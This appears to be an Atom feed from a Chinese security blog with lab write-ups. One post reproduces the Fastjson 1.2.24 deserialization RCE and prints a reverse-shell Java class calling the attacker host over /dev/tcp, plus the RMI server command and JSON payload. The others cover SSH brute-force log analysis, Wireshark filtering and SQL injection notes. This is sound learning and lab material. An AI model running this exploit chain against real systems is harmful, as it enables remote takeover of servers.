<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>顾柒·Blog</title>
  
  <subtitle>山海皆可平</subtitle>
  <link href="https://guuuuq.github.io/atom.xml" rel="self"/>
  
  <link href="https://guuuuq.github.io/"/>
  <updated>2023-04-02T08:36:35.381Z</updated>
  <id>https://guuuuq.github.io/</id>
  
  <author>
    <name>顾柒</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Fastjson_1.2.24反序列化漏洞复现（CVE-2017-18349）</title>
    <link href="https://guuuuq.github.io/posts/d7fc580f.html"/>
    <id>https://guuuuq.github.io/posts/d7fc580f.html</id>
    <published>2023-04-02T15:55:29.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#Fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="Fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>Fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><p>简介：<br>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p>漏洞影响范围：<br>fastjsonfastjson&lt;=1.2.24</p><p>利用Vulhub平台搭建：<br>CentOS 7（攻击目标）：192.168.233.136<br>Kali(攻击机)：192.168.233.129</p><h3 id="进入漏洞目录开启环境"><a href="#进入漏洞目录开启环境" class="headerlink" title="进入漏洞目录开启环境"></a>进入漏洞目录开启环境</h3><p><code>docker-compose up -d</code><br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202304021600497.png" alt=""></p><p>环境运行后，访问<code>http://192.168.233.136:8090</code>即可看到JSON格式的输出</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202304021606429.png" alt=""></p><h3 id="新建TouchFile-java文件内容为"><a href="#新建TouchFile-java文件内容为" class="headerlink" title="新建TouchFile.java文件内容为"></a>新建TouchFile.java文件内容为</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line"></span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line"></span><br><span class="line"> static &#123;</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line">     </span><br><span class="line">             Runtime r = Runtime.getRuntime();</span><br><span class="line">     </span><br><span class="line">             Process p = r.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.233.129/4444 0&gt;&amp;1&quot;&#125;);</span><br><span class="line">     </span><br><span class="line">             p.waitFor();</span><br><span class="line">     </span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="然后使用javac-命令对TouchFile-java文件进行编译"><a href="#然后使用javac-命令对TouchFile-java文件进行编译" class="headerlink" title="然后使用javac 命令对TouchFile.java文件进行编译"></a>然后使用javac 命令对TouchFile.java文件进行编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Pluto\AppData\Roaming\Typora\typora-user-images\image-20230402161351592.png" alt="image-20230402161351592"></p><p>可以看到编译好的TouchFile.class文件</p><h3 id="在kali-中使用python开启http服务"><a href="#在kali-中使用python开启http服务" class="headerlink" title="在kali 中使用python开启http服务"></a>在kali 中使用python开启http服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 1111</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202304021616857.png" alt=""></p><h3 id="把刚才反编译的TouchFile-java放到当前目录下输入192-168-233-129-1111-进行检查"><a href="#把刚才反编译的TouchFile-java放到当前目录下输入192-168-233-129-1111-进行检查" class="headerlink" title="把刚才反编译的TouchFile.java放到当前目录下输入192.168.233.129:1111/进行检查"></a>把刚才反编译的TouchFile.java放到当前目录下输入192.168.233.129:1111/进行检查</h3><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202304021618496.png" alt=""></p><h3 id="使用marshalsec-0-0-3-SNAPSHOT-all-jar，启动一个RMI服务，加载远程类TouchFile-class"><a href="#使用marshalsec-0-0-3-SNAPSHOT-all-jar，启动一个RMI服务，加载远程类TouchFile-class" class="headerlink" title="使用marshalsec-0.0.3-SNAPSHOT-all.jar，启动一个RMI服务，加载远程类TouchFile.class"></a>使用marshalsec-0.0.3-SNAPSHOT-all.jar，启动一个RMI服务，加载远程类TouchFile.class</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.233.129:1111/#TouchFile&quot; 6666</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202304021622475.png" alt=""></p><h3 id="然后在kali上用nc开启端口监听"><a href="#然后在kali上用nc开启端口监听" class="headerlink" title="然后在kali上用nc开启端口监听"></a>然后在kali上用nc开启端口监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202304021624547.png" alt=""></p><h3 id="抓包修改post方式，并且添加下面的内容"><a href="#抓包修改post方式，并且添加下面的内容" class="headerlink" title="抓包修改post方式，并且添加下面的内容"></a>抓包修改post方式，并且添加下面的内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.233.136:8090</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.233.129:6666/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202304021630686.png" alt=""></p><p>反弹shell成功</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202304021629039.png" alt=""></p><h3 id="关闭docker"><a href="#关闭docker" class="headerlink" title="关闭docker"></a>关闭docker</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202304021633728.png" alt=""></p><p>参考：</p><p><a href="https://www.cnblogs.com/pandana/p/16289320.html">https://www.cnblogs.com/pandana/p/16289320.html</a></p><p><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Fastjson-1-2-24-反序列化导致任意命令执行漏洞&quot;&gt;&lt;a href=&quot;#Fastjson-1-2-24-反序列化导致任意命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;Fastjson 1.2.24 反序列化导致任意命令执行漏洞&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>应急响应</title>
    <link href="https://guuuuq.github.io/posts/587e8742.html"/>
    <id>https://guuuuq.github.io/posts/587e8742.html</id>
    <published>2023-03-19T11:42:07.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、应急响应过程"><a href="#一、应急响应过程" class="headerlink" title="一、应急响应过程"></a>一、应急响应过程</h1><p>目的：分析攻击时间、攻击操作、攻击结果、安全修复等并给出合理的解决方案<br>保护阶段：直接断网，保护现场，看是否能够恢复数据<br>分析阶段：对入侵过程进行分析，常见方法为指纹库搜索、日志时间分析、后门追查分析、漏洞检查分析等<br>复现阶段：还原攻击过程，模拟攻击者入侵思路，关注攻击者在系统中应用的漏洞、手法<br>修复阶段：分析原因后，修补相关系统、应用漏洞，如果存在后门或弱口令，及时清除并整改<br>建议阶段：对攻击者利用的漏洞进行修补，加强系统安全同时提高安全意识</p><h1 id="二、必备知识点"><a href="#二、必备知识点" class="headerlink" title="二、必备知识点"></a>二、必备知识点</h1><p>1、熟悉常用的web安全攻击技术<br>2、熟悉相关日志启用以及存储查看等<br>3、熟悉日志中记录数据分类和分析等</p><h1 id="三、准备工作"><a href="#三、准备工作" class="headerlink" title="三、准备工作"></a>三、准备工作</h1><p>1、收集目标服务器信息<br>2、部署相关分析软件和平台等<br>3、整理相关安全渗透测试工具指纹库<br>4、针对异常表现第一时间触发思路</p><p>从受害方提供的信息预估入侵面以及权限面进行排查，分为有明确信息和无明确信息两种情况：</p><p>1、如果有明确信息的情况下，基本上会提出关于时间、操作以及指纹这一类的相关信息<br>基于时间：如果受害方提供了文件被修改日期、异常登录日期，那么我们就可以锁定这一时期的相关日志进行查看，不必去大海捞针一天天地看日志了。从而有针对性地对目标攻击事件进行分析。<br>基于操作：如果受害方提供了被删除、被加密的数据、文件位置，如数据库、磁盘等，那么我们可以根据攻击者的操作判断它入侵了哪些地方并可能分析出攻击过程。<br>基于指纹：如果受害方只说是网页被修改、网站被上马，那么我们可以根据攻击工具的指纹、木马的指纹、病毒的指纹、修改的内容等判断攻击者使用了何种工具、处于何种技术水平。</p><p>2、如果无明确信息的情况下，那么就需要排查全部可能入侵的手法：<br>web漏洞：检查源码类别和漏洞情况<br>中间件漏洞：检查对应版本和漏洞情况<br>第三方应用漏洞：检查是否存在漏洞应用<br>操作系统漏洞：检查是否存在系统漏洞<br>其他安全问题：检查相关用户口令以及后门扫描</p><h1 id="四、实际案例"><a href="#四、实际案例" class="headerlink" title="四、实际案例"></a>四、实际案例</h1><h2 id="攻击响应——暴力破解（SSH）——Linux"><a href="#攻击响应——暴力破解（SSH）——Linux" class="headerlink" title="攻击响应——暴力破解（SSH）——Linux"></a>攻击响应——暴力破解（SSH）——Linux</h2><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>利用弱口令检查工具对我自己搭建的Ubuntu进行远程SSH爆破</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202303191805089.png" alt=""></p><p>爆破失败（可能需要更全的字典或者主机密码为强口令）</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202303191806035.png" alt=""></p><p>利用面向结果字典成功爆破的结果如下</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202303191815026.png" alt=""></p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>Ubuntu的SSH登陆日志保存在/var/log/auth.log 利用命令手动分析筛选日志</p><p>1.统计了下日志，确认服务器遭受多少次暴力破解</p><p><code>grep -o &quot;Failed password&quot; /var/log/auth.log|uniq -c</code></p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202303191925179.png" alt=""></p><p>2.输出登录爆破的第一行和最后一行，确认爆破时间范围</p><p><code>grep &quot;Failed password&quot; /var/log/auth.log|head -1grep &quot;Failed password&quot; /var/log/auth.log|tail -1</code></p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202303191926796.png" alt=""></p><p>3.爆破用户名字典都有哪些？</p><p><code>grep &quot;Failed password&quot; /var/log/auth.log|perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</code></p><p><img src="C:\Users\Pluto\AppData\Roaming\Typora\typora-user-images\image-20230319192832703.png" alt="image-20230319192832703"></p><p>4.登录成功的日期、用户名、IP：</p><p><code>grep &quot;Accepted &quot; /var/log/auth.log | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;grep &quot;Accepted &quot; /var/log/auth.log | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</code></p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202303191933287.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、应急响应过程&quot;&gt;&lt;a href=&quot;#一、应急响应过程&quot; class=&quot;headerlink&quot; title=&quot;一、应急响应过程&quot;&gt;&lt;/a&gt;一、应急响应过程&lt;/h1&gt;&lt;p&gt;目的：分析攻击时间、攻击操作、攻击结果、安全修复等并给出合理的解决方案&lt;br&gt;保护阶段：直接</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Wireshark的简单使用和应用实例</title>
    <link href="https://guuuuq.github.io/posts/f1af617e.html"/>
    <id>https://guuuuq.github.io/posts/f1af617e.html</id>
    <published>2023-02-21T10:29:18.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>WireShark是非常流行的网络封包分析工具，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程中各种问题定位。</p><h1 id="设置普通模式或者混合模式"><a href="#设置普通模式或者混合模式" class="headerlink" title="设置普通模式或者混合模式"></a>设置普通模式或者混合模式</h1><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202302211041951.png" alt=""></p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202302211037784.png" alt=""></p><h1 id="过滤器的使用"><a href="#过滤器的使用" class="headerlink" title="过滤器的使用"></a>过滤器的使用</h1><p>wireshar工具中自带了两种类型的过滤器</p><h2 id="抓包过滤器"><a href="#抓包过滤器" class="headerlink" title="抓包过滤器"></a>抓包过滤器</h2><p>用于在抓包前设置过滤条件</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202302211047158.png" alt=""></p><p>在“输入捕获过滤器” 处输入过滤条件语句</p><h2 id="显示过滤器"><a href="#显示过滤器" class="headerlink" title="显示过滤器"></a>显示过滤器</h2><p>用于在抓包后设置过滤条件</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202302211050368.png" alt=""></p><p>在绿框中设置过滤条件即可，如果语句不完整或者有错误即为红色</p><p>例如绿框中的ip.addr == 10.66.85.116意思是筛选出Source（源主机）和Destination（目的主机）ip地址为10.66.85.116的数据包</p><h1 id="过滤器表达式的规则"><a href="#过滤器表达式的规则" class="headerlink" title="过滤器表达式的规则"></a>过滤器表达式的规则</h1><h2 id="抓包过滤器语法和实例"><a href="#抓包过滤器语法和实例" class="headerlink" title="抓包过滤器语法和实例"></a>抓包过滤器语法和实例</h2><p>抓包过滤器类型Type（host、net、port）、方向Dir（src、dst）、协议Proto（ether、ip、tcp、udp、http、icmp、ftp等）、逻辑运算符（&amp;&amp; 与、|| 或、！非）</p><p>（1）协议过滤</p><p>比较简单，直接在抓包过滤框中直接输入协议名即可</p><p>TCP，只显示TCP协议的数据包列表</p><p>HTTP，只查看HTTP协议的数据包列表</p><p>ICMP，只显示ICMP协议的数据包列表</p><p>（2）IP过滤</p><p>host 192.168.1.104</p><p>src host 192.168.1.104</p><p>dst host 192.168.1.104</p><p>（3）端口过滤</p><p>port 80</p><p>src port 80</p><p>dst port 80</p><p>（4）逻辑运算符&amp;&amp; 与、|| 或、！非</p><p>src host 192.168.1.104 &amp;&amp; dst port 80 抓取主机地址为192.168.1.80目的端口为80的数据包</p><p>host 192.168.1.104 || host 192.168.1.102 抓取主机为192.168.1.104或者192.168.1.102的数据包</p><p>！broadcast 不抓取广播数据包</p><h2 id="显示过滤器语法和实例"><a href="#显示过滤器语法和实例" class="headerlink" title="显示过滤器语法和实例"></a>显示过滤器语法和实例</h2><p>（1）比较操作符</p><p>比较操作符有== 等于、！= 不等于、&gt; 大于、&lt; 小于、&gt;= 大于等于、&lt;=小于等于</p><p>（2）协议过滤</p><p>比较简单，直接在Filter框中直接输入协议名即可。注意：协议名称需要输入小写</p><p>tcp，只显示TCP协议的数据包列表</p><p>http，只查看HTTP协议的数据包列表</p><p>icmp，只显示ICMP协议的数据包列表</p><p>（3） ip过滤<br>ip.src ==192.168.1.104 显示源地址为192.168.1.104的数据包列表</p><p>ip.dst==192.168.1.104, 显示目标地址为192.168.1.104的数据包列表</p><p>ip.addr == 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表</p><p>（4）端口过滤</p><p>tcp.port ==80, 显示源主机或者目的主机端口为80的数据包列表。</p><p>tcp.srcport == 80, 只显示TCP协议的源主机端口为80的数据包列表。</p><p>tcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。</p><p>（5） Http模式过滤</p><p>http.request.method==“GET”, 只显示HTTP GET方法的。</p><p>（6）逻辑运算符为 and/or/not</p><p>过滤多个条件组合时，使用and/or。比如获取IP地址为192.168.1.104的ICMP数据包表达式为ip.addr == 192.168.1.104 and icmp</p><p>（7）按照数据包内容过滤</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202302211106023.png" alt=""></p><p>右键选中数据包中所要筛选的部分点击作为过滤器应用选中即可筛选，也可以选择其他选项排除筛选，准备作为过滤器是将语句发送到过滤器中，可拼接其他语句进行更加细致的过滤</p><h1 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h1><p>BUUCTF_wireshark1</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202302211119327.png" alt=""></p><p>下载附件得到一个流量包</p><p><img src="C:\Users\Pluto\AppData\Roaming\Typora\typora-user-images\image-20230221112139316.png" alt="image-20230221112139316"></p><p>题中提示抓到管理员登陆网站的一段流量包（管理员的密码即是答案）</p><p>有两个思路</p><p>1.网站登陆一般是用POST方式进行传参，可以筛选POST传参的数据包</p><p><code>http.request.method == POST</code></p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202302211125721.png" alt=""></p><p>观察左下角的数据得到flag</p><p>2.直接搜索包含password关键字的数据</p><p>CTRL+F然后设置分组字节流，字符串，关键字设置为password</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202302211130466.png" alt=""></p><p>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;WireShark是非常流行的网络封包分析工具，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程中各种问题定位。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_SQL注入之二次，加解密，DNS等注入</title>
    <link href="https://guuuuq.github.io/posts/b076c178.html"/>
    <id>https://guuuuq.github.io/posts/b076c178.html</id>
    <published>2022-12-22T15:26:17.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="加解密，二次，DNSlog注入"><a href="#加解密，二次，DNSlog注入" class="headerlink" title="加解密，二次，DNSlog注入"></a>加解密，二次，DNSlog注入</h1><p>注入原理，演示案例，实际应用（中转注入） </p><h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><p>有些页面不会直接显示明文的信息，因此需要注入的时候，注入的语句需要先加密</p><p>实际案例：sqli-labs-less21-cookie&amp;加解密注入</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入是无法通过扫描或者黑盒测试来进行挖掘的。一般需要进行源码审计</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212221606740.png" alt=""></p><p>实际案例：sqli-labs-less24-post登陆框&amp;二次注入</p><h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p>解决盲注不能回显数据，效率低的问题</p><p>load_file和DNSlog进行结合，当load_file是能对外进行读取的，请求一个网站的时候，会通过DNSlog传回相关的信息。DNSlog注入必须要有最高权限。</p><p>实际案例：sqli-labs-less9-load_file&amp;dnslog带外注入</p><p>外链平台：ceye.io</p><p>DNSlog注入工具（DnslogSqlinj）：<a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;加解密，二次，DNSlog注入&quot;&gt;&lt;a href=&quot;#加解密，二次，DNSlog注入&quot; class=&quot;headerlink&quot; title=&quot;加解密，二次，DNSlog注入&quot;&gt;&lt;/a&gt;加解密，二次，DNSlog注入&lt;/h1&gt;&lt;p&gt;注入原理，演示案例，实际应用（中转注</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_SQL注入查询方式及报错盲注</title>
    <link href="https://guuuuq.github.io/posts/81841eb6.html"/>
    <id>https://guuuuq.github.io/posts/81841eb6.html</id>
    <published>2022-12-20T14:29:29.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<p>当进行<a href="https://so.csdn.net/so/search?q=SQL注入&amp;spm=1001.2101.3001.7020">SQL注入</a>时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句</p><h2 id="select-查询数据"><a href="#select-查询数据" class="headerlink" title="select 查询数据"></a>select 查询数据</h2><p>在网站应用中进行数据显示查询操作</p><p>例：<code>select * from news where id=$id</code></p><h2 id="insert-插入数据"><a href="#insert-插入数据" class="headerlink" title="insert 插入数据"></a>insert 插入数据</h2><p>在网站应用中进行用户注册添加等操作</p><p>例：<code>insert into news(id,url,text) values(2,&#39;x&#39;,&#39;$t&#39;)</code></p><h2 id="delete-删除数据"><a href="#delete-删除数据" class="headerlink" title="delete 删除数据"></a>delete 删除数据</h2><p>后台管理里面删除文章删除用户等数据</p><p>例：<code>delete from news where id=$id</code></p><h2 id="updata-更新数据"><a href="#updata-更新数据" class="headerlink" title="updata 更新数据"></a>updata 更新数据</h2><p>会员或后台中心数据同步或缓存等操作</p><p>例：<code>updata user set pwd=&#39;$p&#39; where id=2 and username=&#39;admin&#39;</code></p><h2 id="order-by-排列数据"><a href="#order-by-排列数据" class="headerlink" title="order by 排列数据"></a>order by 排列数据</h2><p>一般结合表名或列名进行数据排序操作</p><p>例：<code>select * from news order by $id</code></p><p>例：<code>select * id,name,price from news order by $order</code></p><h2 id="重点理解上述查询和网站应用的关系"><a href="#重点理解上述查询和网站应用的关系" class="headerlink" title="重点理解上述查询和网站应用的关系"></a>重点理解上述查询和网站应用的关系</h2><p>注册一般是插入操作<br>删除帖子一般是删除操作<br>修改信息一般是更新操作等等</p><h1 id="SQL注入报错盲注"><a href="#SQL注入报错盲注" class="headerlink" title="SQL注入报错盲注"></a>SQL注入报错盲注</h1><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类:</p><h2 id="基于报错的SQL盲注-报错回显"><a href="#基于报错的SQL盲注-报错回显" class="headerlink" title="基于报错的SQL盲注-报错回显"></a>基于报错的SQL盲注-报错回显</h2><p>floor, updatexml, extractvalue</p><h2 id="基于布尔的SQL盲注-逻辑判断"><a href="#基于布尔的SQL盲注-逻辑判断" class="headerlink" title="基于布尔的SQL盲注-逻辑判断"></a>基于布尔的SQL盲注-逻辑判断</h2><p>regexp,like, ascii,left,ord , mid</p><h2 id="基于时间的SQL盲注-延时判断"><a href="#基于时间的SQL盲注-延时判断" class="headerlink" title="基于时间的SQL盲注-延时判断"></a>基于时间的SQL盲注-延时判断</h2><p>if,sleep</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><code>like &#39;ro%&#39;</code>判断ro或者ro……是否成立</p><p><code>regexp &#39;^xiaodi[a-z]&#39;</code>匹配xiaodi以及xiaodi……等</p><p><code>if(条件，5,0)</code>条件成立 返回5 反之 返回0</p><p><code>sleep(5)</code>语句延时执行5秒</p><p><code>mid(a,b,c)</code> 从位置b开始，截取a字符串的c位</p><p><code>substr(a,b,c)</code>从b的位置开始，截取字符串a的c长度</p><p><code>left(database(),1)</code>left(a,b) 左侧a的位置截取前b位</p><p><code>length(database()) = 8</code> 判断数据库名database()名的长度</p><p><code>ord= ascii ascii(x) = 97</code>判断ascii码是否等于97</p><h2 id="注入参考语句：https-www-jianshu-com-p-bc35f8dd4f7c"><a href="#注入参考语句：https-www-jianshu-com-p-bc35f8dd4f7c" class="headerlink" title="注入参考语句：https://www.jianshu.com/p/bc35f8dd4f7c"></a>注入参考语句：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当进行&lt;a href=&quot;https://so.csdn.net/so/search?q=SQL注入&amp;amp;spm=1001.2101.3001.7020&quot;&gt;SQL注入&lt;/a&gt;时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_sql注入之Oracle,MongoDB等</title>
    <link href="https://guuuuq.github.io/posts/5bba12b7.html"/>
    <id>https://guuuuq.github.io/posts/5bba12b7.html</id>
    <published>2022-12-16T16:02:45.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见数据库类型"><a href="#常见数据库类型" class="headerlink" title="常见数据库类型"></a>常见数据库类型</h1><p>Access,mssql,mongoDB,postgresql,oracle,sybase等</p><p>Access数据库保存在网站源码下面，自己网站数据库独立存在。没有文件读写等操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表名</span><br><span class="line">列名</span><br><span class="line">数据</span><br></pre></td></tr></table></figure><p>除了Access其他数据库组成架构基本都是大同小异</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数据库A</span><br><span class="line">表名</span><br><span class="line">列名</span><br><span class="line">数据</span><br><span class="line"></span><br><span class="line">数据库B</span><br><span class="line">表名</span><br><span class="line">列名</span><br><span class="line">数据</span><br></pre></td></tr></table></figure><h1 id="简要学习各种数据库的注入特点"><a href="#简要学习各种数据库的注入特点" class="headerlink" title="简要学习各种数据库的注入特点"></a>简要学习各种数据库的注入特点</h1><p>数据库架构组成，数据库高权限操作</p><p>高权限下的注入方式基本一致，在格式上各有不同</p><h1 id="简要学习各种工具的使用指南"><a href="#简要学习各种工具的使用指南" class="headerlink" title="简要学习各种工具的使用指南"></a>简要学习各种工具的使用指南</h1><p>熟悉工具的支持库，注入模式，优缺点等</p><p>Sqlmap，NoSQLAttack，Pangolin等</p><p>利用工具判断数据库，搜索相应数据库的注入格式，终点学习MYSQL的注入方式</p>]]></content>
    
    
      
      
